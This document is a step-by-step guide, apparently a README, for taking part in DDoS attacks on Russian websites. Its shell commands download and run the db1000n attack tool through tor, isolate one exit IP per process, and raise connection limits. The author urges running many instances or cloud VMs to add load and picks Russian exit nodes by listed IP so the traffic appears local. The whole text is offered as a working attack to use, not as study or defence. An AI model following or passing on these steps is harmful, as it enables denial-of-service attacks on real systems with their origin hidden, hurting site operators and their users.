The following instructions allow you to participate in russian sites attack without using any 3rd party VPN, and hence without sharing your personal data with suspicious VPN resource providers and without spending any money resources for such services.

Demo at [YouTube](https://www.youtube.com/watch?v=AVqajaICvt0).

If you have Windows computer - the same instructions work well with WSL distributions, so go ahead and configure Windows Subsystem for Linux in your Windows PC. Personally I am using Kali Linux distribution in WSL on all my Windows PCs (sample of using LattePanda Delta can be watched [here](https://youtu.be/v1v2OhcfwFw) ).

# Installing tor and db1000n

Install tools and download db1000n 
```bash
sudo apt-get -y update && \
sudo apt-get -y install tor torsocks wget curl && \
wget https://github.com/Arriven/db1000n/releases/download/v0.8.21/db1000n_0.8.21_linux_amd64.tar.gz -O db1000n.tar.gz && \
tar xvzf db1000n.tar.gz -C ./
```

# Setting up basic tor options 

Separate IP per torsocks process:
```bash
cat /etc/tor/torsocks.conf | sed 's/#IsolatePID/IsolatePID/g' | sudo tee /etc/tor/torsocks.conf > /dev/null 
```

And max connections limit up to max possible value:
```bash
echo "ConnLimit 32267" | sudo tee -a /etc/tor/torrc > /dev/null
```

# Start tor service
```bash
sudo service tor start
```

# Check you have each time new IP
Repeat this command multiple times to verify you indeed have each time new IP address:
```bash
torsocks curl -L jsonip.com
```

# Run
```bash
torsocks ./db1000n 
```
At this point you already running the attack. 
You may start multiple instances to get more load generated - due to `IsolatePID 1` option in torsocks, everything you start as separate process get separate nmodes used, and as result sdeparate IP address at the exit node.
You also may start such attack in multiple VMs (or EC2/Azure/GCE) instances to produce even more load.

The next topic is about configuring exit nodes at specific locations (for instance if you need to attack from RU internet segment).

#  Find Tor Nodes in specific country
Go to https://metrics.torproject.org/rs.html

Searching only russian outgoing relays: https://metrics.torproject.org/rs.html#search/country:ru

To use specific Nodes from the search result you may use Node's fingerprint or IP address in ExitNodes entry of the torrc config.

So to use Nodes 95.214.54.70, 82.165.116.173 and 185.32.222.237 addthe following entry to `/etc/tor/torrc` file:
```
ExitNodes 95.214.54.70,82.165.116.173,185.32.222.237
```

# More information about configuring Tor
- [torrc man page](https://manpages.debian.org/testing/tor/torrc.5.en.html)
- [torsocks.conf details](https://linux.die.net/man/5/torsocks.conf)
